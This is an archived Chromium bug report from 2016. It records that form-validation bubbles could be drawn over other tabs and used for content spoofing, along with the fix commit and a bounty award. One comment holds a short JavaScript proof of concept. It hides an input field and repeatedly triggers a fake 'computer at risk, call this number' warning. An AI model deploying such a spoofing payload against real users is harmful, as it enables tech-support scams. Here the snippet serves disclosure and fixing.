# Security: Form validation bubbles allow spoofing on other tabs

| Field | Value |
|-------|-------|
| **Issue ID** | [40086194](https://issues.chromium.org/issues/40086194) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Forms>Validation |
| **Reporter** | gn...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2016-12-11 |
| **Bounty** | $1,000.00 |

## Description

DESCRIPTION:  

Content spoofing on any website

**VERSION**  

Chrome Version: Version 55.0.2883.75 (64-bit) stable  

Operating System: Ubuntu 16.04.1 LTS

Chrome Version: Version 55.0.2883.75  

Operating System: Windows 10

Chrome Version: Version 54.0.2840.85 stable  

Operating System: Android 6.0.1 (crash)

POC:

<http://192.243.113.21/spoof/chrome/content1.html>

## Attachments

- [Screenshot from 2016-12-11 23-39-41.png](attachments/Screenshot from 2016-12-11 23-39-41.png) (image/png, 66.7 KB)

## Timeline

### el...@chromium.org (2016-12-12)

Confirmed in 57.2946. This is a UX bug whereby form field validation bubbles can appear over the wrong tab.

function test(){
aaa = document.getElementById("aaa");
aaa.style.opacity = '0';
aaa.oninvalid = function (e) {
e.target.setCustomValidity("WARNING!\nYOUR COMPUTER MAY BE AT RISK.\nCALL: 800-111-2222");
};
setInterval("document.getElementById('bbb').click()",1000);
}
</script>
<form>
    <input placeholder="aaa" required id="aaa" />
    <input id='bbb' type="submit" name="submit">
</form>

[Monorail components: Blink>Forms>Validation]

### el...@chromium.org (2016-12-12)

Possibly related to https://crbug.com/chromium/516694.

### wr...@chromium.org (2016-12-12)

[Empty comment from Monorail migration]

[Monorail components: Platform>DevTools>UX]

### wr...@chromium.org (2016-12-12)

[Empty comment from Monorail migration]

[Monorail components: -Platform>DevTools>UX Security>UX]

### wr...@chromium.org (2016-12-12)

Correcting the UX tags, so hopefully the Enamel team will see this.

### lg...@chromium.org (2016-12-12)

[Empty comment from Monorail migration]

[Monorail components: -Security>UX]

### wr...@chromium.org (2016-12-12)

Per Enamel folks, the Security>UX component is officially deprecated and the Team-Security-UX label should be used instead.

### sh...@chromium.org (2016-12-13)

[Empty comment from Monorail migration]

### tk...@chromium.org (2016-12-14)

[Empty comment from Monorail migration]

### tk...@chromium.org (2016-12-15)

Though Bugdroid didn't notify a commit, [1] fixed this issue.

[1] https://crrev.com/a8e17a3031b6ad69c399e5e04dd0084e577097fc


### go...@chromium.org (2016-12-15)


+ awhalley@ for merge review.

### go...@chromium.org (2016-12-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-15)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-12-16)

[Automated comment] Request affecting a post-stable build (M55), manual review required.

### di...@chromium.org (2016-12-16)

Your change meets the bar and is auto-approved for M56 (branch: 2924)

### bu...@chromium.org (2016-12-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3839b3cc636bc10b5385a4f618e5b6ccfac4466b

commit 3839b3cc636bc10b5385a4f618e5b6ccfac4466b
Author: Kent Tamura <tkent@chromium.org>
Date: Fri Dec 16 05:56:33 2016

Merge "Form validation: Do not show validation bubble if the page is invisible." to M56 branch

BUG=673163

Review-Url: https://codereview.chromium.org/2572813003
Cr-Commit-Position: refs/heads/master@{#438476}
(cherry picked from commit a8e17a3031b6ad69c399e5e04dd0084e577097fc)

Review-Url: https://codereview.chromium.org/2585473004 .
Cr-Commit-Position: refs/branch-heads/2924@{#523}
Cr-Branched-From: 3a87aecc31cd1ffe751dd72c04e5a96a1fc8108a-refs/heads/master@{#433059}

[modify] https://crrev.com/3839b3cc636bc10b5385a4f618e5b6ccfac4466b/third_party/WebKit/Source/core/html/HTMLFormControlElement.cpp


### aw...@google.com (2016-12-16)

[Empty comment from Monorail migration]

### aw...@google.com (2016-12-19)

[Empty comment from Monorail migration]

### mb...@chromium.org (2017-01-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-09)

[Empty comment from Monorail migration]

### aw...@google.com (2017-01-10)

Many thanks for the report.  The panel decided to reward $1,000 for this bug.  A member of our finance team will reach out shortly.

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2017-01-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-03-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/673163?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086194)*
